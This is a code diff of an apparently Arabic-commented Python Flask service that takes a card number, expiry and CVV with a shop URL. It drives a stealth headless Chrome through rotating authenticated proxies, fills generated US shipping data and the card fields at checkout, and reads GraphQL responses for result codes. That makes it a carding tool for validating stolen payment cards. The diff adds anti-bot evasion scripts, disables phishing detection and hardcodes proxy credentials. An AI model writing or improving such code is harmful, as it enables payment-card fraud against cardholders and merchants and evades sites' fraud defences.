@@ -38,8 +38,6 @@ active_tasks_lock = threading.Lock()
 # ==================== قائمة البروكسيات ====================
 PROXY_LIST = [
     {"host": "px440401.pointtoserver.com", "port": "10780", "user": "purevpn0s8732217", "pass": "i67s60ep"},
-    # تقدر تضيف بروكسيات إضافية
-    # {"host": "proxy2.com", "port": "8080", "user": "user2", "pass": "pass2"},
 ]
 
 def get_random_proxy():
@@ -48,14 +46,11 @@ def get_random_proxy():
 def create_proxy_extension(proxy_host, proxy_port, proxy_user, proxy_pass):
     """
     إنشاء Chrome Extension للمصادقة على البروكسي
-    ترجع مسار ملف الـ extension
     """
-    # مجلد مؤقت للـ extension
-    ext_dir = f'/tmp/proxy_ext_{random.randint(10000, 99999)}'
+    ext_dir = f'/tmp/proxy_ext_{os.getpid()}_{random.randint(10000, 99999)}'
     os.makedirs(ext_dir, exist_ok=True)
     
-    # manifest.json
-    manifest = {
+    manifest_json = json.dumps({
         "version": "1.0.0",
         "manifest_version": 2,
         "name": "Proxy Auth Extension",
@@ -73,12 +68,11 @@ def create_proxy_extension(proxy_host, proxy_port, proxy_user, proxy_pass):
             "persistent": True
         },
         "minimum_chrome_version": "22.0.0"
-    }
+    })
     
     with open(os.path.join(ext_dir, 'manifest.json'), 'w') as f:
-        json.dump(manifest, f)
+        f.write(manifest_json)
     
-    # background.js
     background_js = f"""
     var config = {{
         mode: "fixed_servers",
@@ -109,31 +103,13 @@ def create_proxy_extension(proxy_host, proxy_port, proxy_user, proxy_pass):
         ['blocking']
     );
     
-    console.log('Proxy extension loaded: {proxy_host}:{proxy_port}');
+    console.log('Proxy extension loaded successfully');
     """
     
     with open(os.path.join(ext_dir, 'background.js'), 'w') as f:
         f.write(background_js)
     
     return ext_dir
-
-def pack_extension(ext_dir):
-    """ضغط extension إلى ملف crx أو zip"""
-    crx_path = ext_dir + '.zip'
-    
-    # تنظيف الملف القديم إذا موجود
-    if os.path.exists(crx_path):
-        os.remove(crx_path)
-    
-    # إنشاء ملف zip
-    with zipfile.ZipFile(crx_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-        for root, dirs, files in os.walk(ext_dir):
-            for file in files:
-                file_path = os.path.join(root, file)
-                arcname = os.path.relpath(file_path, ext_dir)
-                zf.write(file_path, arcname)
-    
-    return crx_path
 
 def create_driver_with_proxy(proxy_dict, task_id=None):
     """
@@ -144,7 +120,6 @@ def create_driver_with_proxy(proxy_dict, task_id=None):
     proxy_user = proxy_dict['user']
     proxy_pass = proxy_dict['pass']
     
-    # إنشاء extension للبروكسي
     ext_dir = create_proxy_extension(proxy_host, proxy_port, proxy_user, proxy_pass)
     
     chrome_options = Options()
@@ -160,6 +135,7 @@ def create_driver_with_proxy(proxy_dict, task_id=None):
     chrome_options.add_argument('--disable-gpu')
     chrome_options.add_argument('--disable-notifications')
     chrome_options.add_argument('--window-size=1920,1080')
+    chrome_options.add_argument('--start-maximized')
     chrome_options.add_argument('--disable-background-networking')
     chrome_options.add_argument('--disable-sync')
     chrome_options.add_argument('--disable-translate')
@@ -167,9 +143,17 @@ def create_driver_with_proxy(proxy_dict, task_id=None):
     chrome_options.add_argument('--mute-audio')
     chrome_options.add_argument('--no-first-run')
     chrome_options.add_argument('--no-default-browser-check')
+    chrome_options.add_argument('--single-process')
+    chrome_options.add_argument('--disable-ipc-flooding-protection')
+    chrome_options.add_argument('--memory-pressure-off')
+    chrome_options.add_argument('--disable-component-extensions-with-background-pages')
+    chrome_options.add_argument('--disable-client-side-phishing-detection')
+    chrome_options.add_argument('--disable-hang-monitor')
+    chrome_options.add_argument('--disable-prompt-on-repost')
+    chrome_options.add_argument('--disable-renderer-backgrounding')
+    chrome_options.add_argument('--disable-backgrounding-occluded-windows')
     chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
     
-    # إضافة extension البروكسي
     chrome_options.add_argument(f'--load-extension={ext_dir}')
     chrome_options.add_argument('--disable-extensions-except=' + ext_dir)
     
@@ -177,10 +161,42 @@ def create_driver_with_proxy(proxy_dict, task_id=None):
     
     driver = webdriver.Chrome(options=chrome_options)
     
-    # إخفاء علامات الأتمتة
-    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+    # استخدام CDP لحقن كود إخفاء الأتمتة قبل تحميل أي صفحة
+    try:
+        driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
+            'source': '''
+                Object.defineProperty(navigator, 'webdriver', {
+                    get: () => undefined,
+                    configurable: true
+                });
+                
+                window.chrome = {
+                    runtime: {}
+                };
+                
+                Object.defineProperty(navigator, 'plugins', {
+                    get: () => [1, 2, 3, 4, 5],
+                    configurable: true
+                });
+                
+                Object.defineProperty(navigator, 'languages', {
+                    get: () => ['en-US', 'en'],
+                    configurable: true
+                });
+                
+                const originalQuery = window.navigator.permissions.query;
+                window.navigator.permissions.query = (parameters) => (
+                    parameters.name === 'notifications' ?
+                    Promise.resolve({state: Notification.permission}) :
+                    originalQuery(parameters)
+                );
+            '''
+        })
+        logger.info(f"[{task_id}] CDP evasion script injected successfully")
+    except Exception as e:
+        logger.warning(f"[{task_id}] CDP injection warning: {e}")
     
-    # تنظيف الملفات المؤقتة بعد إنشاء driver
+    # تنظيف الملفات المؤقتة
     try:
         shutil.rmtree(ext_dir, ignore_errors=True)
     except:
@@ -293,12 +309,18 @@ MATCHED_ADDRESSES = [
 ]
 
 def generate_matched_shipping_data():
+    """
+    توليد بيانات شحن أمريكية متطابقة بالكامل
+    """
     address = random.choice(MATCHED_ADDRESSES).copy()
     username = f"{address['first_name'].lower()}{address['last_name'].lower()}{random.randint(1, 999)}"
     address["email"] = f"{username}@{address['email_domain']}"
     return address
 
 def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
+    """
+    طريقة استخراج - تعطي أولوية للـ codes التي تحتوي على شرطة سفلية _
+    """
     
     valid_codes = []
     for code in all_codes:
@@ -356,6 +378,14 @@ def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
     return None, None
 
 def ff(ccx, site, task_id=None):
+    """
+    دالة معالجة بطاقة واحدة وموقع واحد
+    تعمل بشكل مستقل تماماً - كل استدعاء له متصفحه الخاص
+    
+    ccx: رقم البطاقة|الشهر|السنة|cvv
+    site: رابط الموقع
+    task_id: معرف المهمة للتتبع
+    """
     
     if task_id:
         with active_tasks_lock:
@@ -389,7 +419,6 @@ def ff(ccx, site, task_id=None):
     
     # ==================== 1. جلب رابط الدفع ====================
     try:
-        # استخدام بروكسي عشوائي للـ requests
         proxy_dict = get_random_proxy()
         proxy_url = f"http://{proxy_dict['user']}:{proxy_dict['pass']}@{proxy_dict['host']}:{proxy_dict['port']}"
         proxies = {"http": proxy_url, "https": proxy_url}
@@ -455,11 +484,9 @@ def ff(ccx, site, task_id=None):
     # ==================== 2. تشغيل المتصفح مع بروكسي Extension ====================
     driver = None
     try:
-        # استخدام بروكسي عشوائي للمتصفح
         proxy_dict = get_random_proxy()
         driver = create_driver_with_proxy(proxy_dict, task_id)
         
-        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
         wait = WebDriverWait(driver, 15)
         driver.set_page_load_timeout(25)
         
@@ -516,7 +543,8 @@ def ff(ccx, site, task_id=None):
             driver.execute_script("arguments[0].click();", continue_btn)
             time.sleep(2)
             
-        except:
+        except Exception as e:
+            logger.error(f"[{task_id}] Shipping fill error: {str(e)}")
             return {"success": False, "code": None, "error": "Shipping fill failed", "task_id": task_id}
         
         # ==================== 4. تعبئة الدفع ====================
@@ -538,11 +566,12 @@ def ff(ccx, site, task_id=None):
                     
                     for input_elem in inputs:
                         data_field = input_elem.get_attribute('data-field') or ''
-                        placeholder = input_elem.get_attribute('placeholder') or ''
-                        autocomplete = input_elem.get_attribute('autocomplete') or ''
-                        input_id = input_elem.get_attribute('id') or ''
+                        placeholder = (input_elem.get_attribute('placeholder') or '').lower()
+                        autocomplete = (input_elem.get_attribute('autocomplete') or '').lower()
+                        input_id = (input_elem.get_attribute('id') or '').lower()
+                        name_attr = (input_elem.get_attribute('name') or '').lower()
                         
-                        if not card_filled and (data_field == 'number' or 'card number' in placeholder.lower() or autocomplete == 'cc-number'):
+                        if not card_filled and (data_field == 'number' or 'card number' in placeholder or autocomplete == 'cc-number' or 'cardnumber' in name_attr or 'number' in input_id):
                             driver.execute_script("""
                                 arguments[0].focus();
                                 arguments[0].value = '';
@@ -554,7 +583,7 @@ def ff(ccx, site, task_id=None):
                             card_filled = True
                             time.sleep(0.2)
                         
-                        elif not expiry_filled and (data_field == 'expiry' or 'expiry' in placeholder.lower() or autocomplete == 'cc-exp'):
+                        elif not expiry_filled and (data_field == 'expiry' or 'expiry' in placeholder or autocomplete == 'cc-exp' or 'exp-date' in name_attr or 'expiry' in input_id):
                             driver.execute_script("""
                                 arguments[0].focus();
                                 arguments[0].value = '';
@@ -566,7 +595,7 @@ def ff(ccx, site, task_id=None):
                             expiry_filled = True
                             time.sleep(0.2)
                         
-                        elif not cvv_filled and (data_field == 'cvv' or 'cvv' in placeholder.lower() or autocomplete == 'cc-csc'):
+                        elif not cvv_filled and (data_field == 'cvv' or 'cvv' in placeholder or autocomplete == 'cc-csc' or 'verification_value' in name_attr or 'cvc' in input_id or 'cvv' in input_id):
                             driver.execute_script("""
                                 arguments[0].focus();
                                 arguments[0].value = '';
@@ -578,7 +607,7 @@ def ff(ccx, site, task_id=None):
                             cvv_filled = True
                             time.sleep(0.2)
                         
-                        elif not name_filled and (data_field == 'name' or 'name' in placeholder.lower() or autocomplete == 'cc-name'):
+                        elif not name_filled and (data_field == 'name' or 'name' in placeholder or autocomplete == 'cc-name' or 'cardholder' in name_attr or 'cc-name' in name_attr):
                             driver.execute_script("""
                                 arguments[0].focus();
                                 arguments[0].value = '';
@@ -602,7 +631,8 @@ def ff(ccx, site, task_id=None):
             if not (card_filled and expiry_filled and cvv_filled and name_filled):
                 return {"success": False, "code": None, "error": "Payment fill failed", "task_id": task_id}
             
-        except:
+        except Exception as e:
+            logger.error(f"[{task_id}] Payment fill error: {str(e)}")
             return {"success": False, "code": None, "error": "Payment error", "task_id": task_id}
         
         # ==================== 5. اعتراض GraphQL ====================
@@ -1223,6 +1253,15 @@ def ff(ccx, site, task_id=None):
 # ==================== Routes ====================
 @app.route('/', methods=['GET'])
 def home():
+    """
+    نقطة النهاية الرئيسية
+    
+    الاستخدام:
+    /?cc=بطاقة|شهر|سنة|cvv&url=رابط_الموقع
+    
+    مثال:
+    /?cc=4918460118934875|08|2027|293&url=https://www.example.com
+    """
     cc = request.args.get('cc')
     url = request.args.get('url')
     
@@ -1234,6 +1273,7 @@ def home():
         })
     
     task_id = f"task_{int(time.time()*1000)}_{random.randint(1000,9999)}"
+    
     future = executor.submit(ff, cc, url, task_id)
     
     try:
@@ -1249,6 +1289,9 @@ def home():
 
 @app.route('/status', methods=['GET'])
 def status():
+    """
+    معرفة حالة جميع المهام النشطة
+    """
     with active_tasks_lock:
         return jsonify({
             "active_tasks_count": len(active_tasks),
